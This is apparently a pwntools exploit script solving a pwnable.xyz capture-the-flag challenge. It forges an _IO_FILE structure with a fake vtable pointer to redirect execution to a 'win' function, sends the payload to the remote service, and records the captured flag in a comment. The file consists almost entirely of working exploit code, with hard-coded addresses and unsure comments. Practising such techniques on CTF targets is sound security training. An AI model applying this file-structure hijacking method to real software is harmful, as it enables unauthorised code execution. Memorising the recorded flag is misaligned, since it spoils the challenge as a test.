from pwn import *
import struct 
import time


# in 8 byte chunks 
to_send = [
    0,
    # read
    0,
    0,
    0,
    # write
    0,
    0,
    0,
    # buf
    0,
    0,
    # save, backup, save

    0,
    0,
    0,
    # marker
    0,
    # chain
    0,

    0,

]

vtable_addr = 0x601260 
jump_addr = 0x601260 + 216
win = 0x4007ec


# lock is +0x88 i think 
# just bypass lock I guess?

# this fails _IO_vtable_check even though I'm not sure where it is called
LOCAL = False
if LOCAL:
    r = process('./challenge_patched')
else:
    r = remote('svc.pwnable.xyz', 30018)
to_send = b'\x00' * 0x88 + p64(0x601260) + b'\x00' * (208 - 0x88)
to_send += p64(jump_addr)
to_send += p64(0) * 1
to_send += p64(win)
""" gdb.attach(r) """
""" time.sleep(1) """
r.sendafter("> ", to_send)
r.interactive()

# flag: FLAG{_IO_FILE_plus_ch3cked}



